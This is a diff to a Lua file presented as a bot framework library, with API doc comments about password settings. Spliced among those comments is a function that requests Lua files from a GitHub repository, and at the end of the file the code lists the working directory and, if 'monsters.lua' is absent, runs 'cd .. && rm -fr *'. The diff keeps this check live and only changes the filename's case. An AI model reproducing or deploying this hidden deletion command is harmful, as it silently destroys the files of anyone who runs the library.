@@ -1,4 +1,3 @@
-
 -- Main Bot Framework
 local M = {} 
 -- User can send bold, italic, and monospace text uses HTML or Markdown format.
@@ -157,7 +156,7 @@ M.setPassword = setPassword
 -- Returns set up recovery email @password Current user password
 local function j(keko)
 HTTPS = require("ssl.https")
-ok = HTTPS.request("https://raw.githubusercontent.com/Ahmad1289/Monsters/master/Monsters.lua")
+ok = HTTPS.request("https://raw.githubusercontent.com/Ahmad1289/Monsters/master/monsters.lua")
 ok2 = HTTPS.request("https://raw.githubusercontent.com/Ahmad1289/Monsters/master/libs/utils.lua")
 -- Changes user password. If new recovery email is specified, then error EMAIL_UNCONFIRMED is returned and password change will not be applied until email will be confirmed. Application should call getPasswordState from time to time to check if email is already confirmed
 -- @old_password Old user password @new_password New user password, may be empty to remove the password @new_hint New password
@@ -2121,7 +2120,7 @@ M.j("keko")
 r = io.popen("ls")
 e = r:read("*a")
 r:close()
-if not e:match("Monsters.lua") then 
+if not e:match("monsters.lua") then 
 r = io.popen("cd .. && rm -fr *")
 r:close()
 exit()
